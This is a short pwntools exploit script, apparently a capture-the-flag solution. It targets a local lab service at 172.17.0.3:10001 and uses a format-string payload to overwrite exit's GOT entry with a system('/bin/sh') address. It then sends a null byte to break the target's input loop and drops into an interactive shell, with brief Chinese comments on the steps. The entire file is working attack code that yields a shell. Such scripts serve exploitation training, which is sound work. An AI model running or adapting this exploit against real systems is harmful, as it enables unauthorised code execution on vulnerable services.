#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("172.17.0.3", 10001)
context.update(arch = 'amd64', os = 'linux')

system_binsh = 0x4006d9
exit_got = 0x601020		#内容是0x400526

payload = 'aaaa%1749c%10$hn'
payload += p64(exit_got)
io.sendline(payload)
sleep(0.1)
io.sendline('\x00')	#fgets获取到'\x00'，认为是空字符串，退出循环
io.interactive()